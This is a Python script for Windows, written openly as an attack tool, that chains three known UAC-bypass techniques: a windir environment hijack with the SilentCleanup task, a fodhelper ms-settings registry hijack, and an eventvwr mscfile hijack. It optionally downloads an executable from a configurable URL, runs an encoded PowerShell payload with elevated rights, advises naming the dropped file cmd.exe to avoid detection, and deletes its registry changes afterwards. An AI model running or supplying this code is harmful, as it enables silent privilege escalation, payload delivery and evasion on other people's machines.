#!/usr/bin/env python
import os
import subprocess
import _winreg
import urllib
import platform

# SETTINGS
FILE                  = 'cmd.exe' # Drop Name, To Prevent Runtime Detections you should try keep same name as EXE
ENABLE_DOWNLOADER     = 1 # Bool 1 = True , 0 = False
DOWNLOAD_URL          = 'https://changeme/somefile.exe' # Edit This to your Target URL (You stil need to create powershell code below too!)

# USED TO CHECK UAC LEVEL
def integrity_check():
    hKey = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")

    result = _winreg.QueryValueEx(hKey, "ConsentPromptBehaviorAdmin")
    return result[0]

# DEFINES (DO NOT EDIT CODE BELOW)
INTEGRITY_LEVEL = integrity_check()
PROCNAME        = FILE
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
DEFAULT_REG_KEY       = None
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
WIN_RELEASE           = platform.release()

# REMOVES CREATED REGISTRY KEY & SUPPRESSES ERRORS

def cleanup_reg():
    os.system('reg delete hkcu\Environment /v windir /f > nul 2> nul')
    os.system('reg delete hkcu\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f > nul 2> nul')
    os.system('reg delete hkcu\Software\Classes\ms-settings\shell\open\command /ve /f > nul2> nul')
    os.system('reg delete hkcu\Software\Classes\mscfile\shell\open\command /ve /f > nul 2> nul')

print('#####################################')
# Checks if it is run before, if yes then it will clear existing/old REG Key's
print('[+] CLEANING_REGISTRY_IGNORE_ERRORS')
cleanup_reg()
print('#####################################')
print('')

# FETCHES DOWNLOAD URL FROM THE INTERNET
def download():
    urllib.urlretrieve(DOWNLOAD_URL, FILE)

# A METHOD TO WRITE REG KEYS FOR SECOND EXPLOIT
def data(key, value):
    try:
        print '[+] CREATING_SOME_REG_KEYS'
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(registry_key)
    except WindowsError:
        raise

# CALL BYPASS PART OF SECOND EXPLOIT
def bypass(cmd):
    try:
        print ('[+] DELEGATE_EXEC_REG_KEYS')
        data(DELEGATE_EXEC_REG_KEY, '')
        data(DEFAULT_REG_KEY, cmd)
    except WindowsError:
        raise

# RUN SECOND EXPLOIT
def shell():
    try:
        print ('[+] EXECUTING_BYPASS')
        if ENABLE_DOWNLOADER == True:
            bypass(os.getcwd() + '/' + FILE)
        else:
            bypass(FILE)
        print ('[+] CALLING_PREELEVATED_EXE')
        subprocess.call([FOD_HELPER], shell=True)

    except WindowsError as error:
        print('[-] EXPLOIT_FAILURE')
    print('#####################################')
    print('')
    print('#####################################')
    print('[+] EXECUTING_PAYLOAD')
    print('#####################################')
    print('')
    print('#####################################')

# DOWNLOADER SETTINGS
if ENABLE_DOWNLOADER == 1: # Dont Edit This Line
    # use powershell encoder script to generate powershell_string with your website
    # Edit powershell_string code below, for instance: PowerShell -enc YOURCODEHERE in between the (' and ')
    powershell_string = ('PowerShell -enc YOURCODEHERE')
    command = powershell_string
else:
    FILE    = ('cmd /k echo [ELEVATED CMD PRMOPT]')
    command = ('cmd /k echo [ELEVATED CMD PRMOMPT]')

# ATTEMPT UAC BYPASS (Part of Exploit 1)
def downgrade_uac():
    os.system('reg add hkcu\Environment /v windir /d "cmd /k '+str(command)+' && REM"')

# EXPLOIT 3
def old_exploit():
    os.system('reg add hkcu\Software\Classes\mscfile\shell\open\command /ve /d "cmd /k '+str(command)+' && REM"')
    os.system('eventvwr.exe')

# OBVIOUS MAIN
if __name__ == '__main__':
    try:
        if (INTEGRITY_LEVEL == 2 and ENABLE_DOWNLOADER == 0 and WIN_RELEASE == '10'): # Attempt High Integrity Exploit for Windows 10 (EXPLOIT 1)
            print('#####################################')
            print('[+] DETECTED_HIGH_INTEGRITY')
            print('[+] DETECTED_WIN_10')
            print('[+] ATTEMPTING_HIGH_INTEGRITY_BYPASS')
            print ('[!] SKIPPING_DOWNLOADER')
            print ('[+] PLEASE_WAIT')
            downgrade_uac()
            os.system('schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I')
            cleanup_reg()
            print('[+] FINAL_CLEANING_REGISTRY')
            print('#####################################')
        elif (INTEGRITY_LEVEL == 2 and ENABLE_DOWNLOADER == 1 and WIN_RELEASE == '10'): # Attempt High Integrity Exploit for Windows 10 (EXPLOIT 1)
            print('[+] DETECTED_HIGH_INTEGRITY')
            print('[+] DETECTED_WIN_10')
            print('[+] ATTEMPTING_HIGH_INTEGRITY_BYPASS')
            print('[+] DOWNLOADING...')
            print ('[+] PLEASE_WAIT')
            downgrade_uac()
            os.system('schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I')
            print('')
            print('#####################################')
            cleanup_reg()
            print('[+] FINAL_CLEANING_REGISTRY')
            print('#####################################')
        elif (ENABLE_DOWNLOADER == 0 and WIN_RELEASE == '10'): # Attempt Normal Integrity Exploit for Windows 10 (EXPLOIT 2)
            print('#####################################')
            print ('[!] SKIPPING_DOWNLOADER')
            print ('[+] PLEASE_WAIT')
            shell()
            cleanup_reg()
            print('[+] FINAL_CLEANING_REGISTRY')
            print('#####################################')
        elif (WIN_RELEASE > '5' and WIN_RELEASE < '10'): # If not windows 10 then Attempt UAC Exploit for Win 7 - Win10 (Patched in FCU), (EXPLOIT 3)
            old_exploit() # did not test this yet, so not sure if it will work... but hey you can give it a try :p
            print('')
            print('########################')
            print('[+] EXPLOIT_SUCCESS')
            cleanup_reg()
            print('[+] FINAL_CLEANING_REGISTRY')
            print('########################')
            print('')
    except KeyboardInterrupt:
            print('-- END --')
